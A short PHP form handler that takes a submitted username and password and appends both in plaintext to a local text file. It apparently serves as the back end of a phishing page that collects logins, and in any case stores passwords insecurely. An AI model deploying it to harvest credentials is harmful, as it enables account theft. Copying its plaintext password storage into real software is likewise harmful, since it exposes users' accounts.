<?php
// Retrieve the data from the form submission
$username = $_POST['username'];
$password = $_POST['password'];

// Open a file to save the credentials (you can change this to save to a database)
$file = fopen("credentials.txt", "a");  // Open file in append mode
if ($file) {
    // Save the username and password in the file
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n\n");
    fclose($file);  // Close the file after writing
    echo "Credentials saved successfully.";
} else {
    echo "Error saving credentials.";
}

// Optionally, redirect to another page or show a message
// header('Location: thank_you_page.php');  // Uncomment to redirect to a thank-you page
?>